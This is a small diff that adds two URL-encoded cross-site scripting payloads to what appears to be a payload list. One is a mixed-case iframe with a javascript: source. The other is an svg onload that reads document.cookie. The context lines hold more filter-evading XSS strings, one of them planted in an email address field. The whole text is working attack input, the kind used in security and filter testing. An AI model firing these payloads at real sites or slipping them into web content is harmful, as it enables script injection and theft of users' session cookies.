@@ -141,3 +141,7 @@
 toString=\u0061lert;window+' '
 toString=\u0061lert;window+''
 "hello<form/><!><details/open/ontoggle=alert(1)>"@gmail.com
+%22%26%23x27%3B%3E%3CiFrAme%2Fsrc%3DjaVascRipt%3Aprompt.valueOf%28%29%281%29%3E%3C%2FiFramE%3E
+%3CsVg%2Fonload%3Dprompt%28document.cookie%29%3E
+
+
